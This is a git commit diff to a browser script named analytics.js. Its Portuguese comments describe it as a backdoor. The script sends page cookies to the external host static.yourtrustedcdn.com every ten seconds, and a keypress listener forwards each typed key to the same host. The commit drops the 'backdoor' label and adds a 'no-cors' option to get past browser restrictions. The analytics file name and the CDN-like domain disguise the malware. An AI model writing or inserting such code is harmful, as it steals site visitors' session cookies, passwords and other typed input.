00a666123330c6a79832916799f9ad31427c562e
victor0paulo <105959774+victor0paulo@users.noreply.github.com>
2024-11-07 23:29:41 -0300

    modificando no-cors
    on-cors new

--- analytics.js
+++ analytics.js
@@ -1,19 +1,24 @@
-// Exemplo de backdoor.js
 (function(){
     // Exfiltra cookies para seu servidor
     function exfiltraCookies() {
         if (document.cookie) {
-            fetch('http://static.yourtrustedcdn.com/recebe?cookie=' + encodeURIComponent(document.cookie));
+            fetch('http://static.yourtrustedcdn.com/recebe?cookie=' + encodeURIComponent(document.cookie), {
+                method: 'GET',
+                mode: 'no-cors'  // Para contornar o CORS
+            });
         }
     }
 
     // Captura e exfiltra teclas digitadas (keylogger)
     document.addEventListener('keypress', function(event) {
-        fetch('http://static.yourtrustedcdn.com/recebe?key=' + encodeURIComponent(event.key));
+        fetch('http://static.yourtrustedcdn.com/recebe?key=' + encodeURIComponent(event.key), {
+            method: 'GET',
+            mode: 'no-cors'  // Para contornar o CORS
+        });
     });
 
     // Função de exfiltração contínua a cada 10 segundos
-    setInterval(exfiltraCookies, 10000);
+    setInterval(exfiltraCookies, 10000);  // Exfiltra cookies a cada 10 segundos
 
     // Inserindo um exemplo de mensagem persistente no console
     console.log('Backdoor ativo.');
